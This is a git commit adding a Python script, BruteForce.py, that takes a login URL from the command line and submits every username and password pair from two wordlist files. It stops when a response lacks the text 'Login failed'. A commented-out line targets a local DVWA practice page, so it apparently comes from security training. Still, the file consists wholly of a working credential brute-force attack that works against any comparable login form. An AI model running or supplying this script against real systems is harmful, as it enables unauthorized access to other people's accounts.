123b6733b6c95bf8ff98869cc5e41e691e244d34
Tejas28 <pathak.tejas28@gmail.com>
2023-10-11 23:43:53 +0530

    Add files via upload

---
+++ BruteForce.py
@@ -0,0 +1,50 @@
+import requests
+import sys
+import validators
+
+#url="http://192.168.1.14/dvwa/login.php"
+
+#Using sys library to enter the url as an input
+def get_url():
+    url=sys.argv[1]
+
+    if not validators.url(url):
+        print("Invalid URL")
+    return url
+
+input=get_url()
+
+#Reading the Username and Password Files
+obj_username=open("Username.txt","r")
+username=obj_username.read()
+userlist=[line.strip() for line in open("Username.txt")]
+obj_password=open("Password.txt","r")
+password=obj_password.read()
+passwordlist=[line.strip() for line in open("Password.txt")]
+
+#boolean variable so that when we get the right combination the loop will break.
+bol=False
+
+for name in userlist:
+
+    if not bol:
+        for passwd in passwordlist:
+
+
+            credentials={
+            "username":name,
+            "password":passwd,
+            "Login":"Login"
+            }
+
+            req=requests.post (input , data = credentials) #creating post requests to send the target
+            print(req.text)
+            if req.text.find("Login failed") == -1: #if in the reply message"Invalid Login is not present , those are the correct credentials
+                print(f"[+] Correct username is {name} and Correct Password is {passwd}")
+                bol=True
+                break
+            else:
+                 print(f"[-] Login failed with {name} and {passwd} ")
+
+    else:
+        break
